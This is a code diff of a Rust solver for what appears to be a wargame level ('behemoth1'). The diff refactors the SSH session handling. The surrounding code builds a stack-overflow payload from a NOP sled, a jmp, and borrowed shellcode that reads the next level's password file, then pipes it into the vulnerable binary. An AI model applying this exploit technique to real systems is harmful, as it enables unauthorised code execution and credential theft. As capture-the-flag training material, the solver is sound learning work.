@@ -6,12 +6,9 @@ use anyhow::Result;
 /// so execution will be hit overflow, jump back to beginning of variable stack, follow nops, jump over overflow and start shell code.
 /// shellcode used just reads the target file, and is sourced from here: https://shell-storm.org/shellcode/files/shellcode-73.html
 pub fn solve(password: &str) -> Result<String> {
-    let session = ssh_session(super::HOST, super::PORT, "behemoth1", password)?;
 
-    let mut channel = session.channel_session()?;
-    create_shell(&mut channel)?;
-
-    read_until(&mut channel, "behemoth1@gibson:~$ ")?;
+    let mut ssh = SSHShell::connect(super::HOST, super::PORT, "behemoth1", password)?;
+    ssh.read_until("$ ")?;
 
     let nop_sled: Vec<u8> = vec![0x90; 69]; // the offset is 71 to the ret address. 71 - length of jmp is 69 (nice)
     let jmp_esp = hex_decode("eb04")?; // jmp 6 (4 + length of instruction, eb 04), used to jump over the next four bytes below
@@ -32,11 +29,11 @@ pub fn solve(password: &str) -> Result<String> {
     println!("running 'echo -e [payload] | {target}'");
 
     let cmd = format!("echo -e \"{encoded}\" | {target}");
-    write_line(&mut channel, &cmd)?;
+    ssh.write_line(&cmd)?;
 
     println!("reading result");
 
-    let result = read_until(&mut channel, "behemoth1@gibson:~$ ")?;
+    let result = ssh.read_until("behemoth1@gibson:~$ ")?;
     let result: Vec<&str> = result.split("\n").collect();
     let result = result[result.len() - 2].trim();
     println!("retrieved behemoth2 pass '{result}'\n");
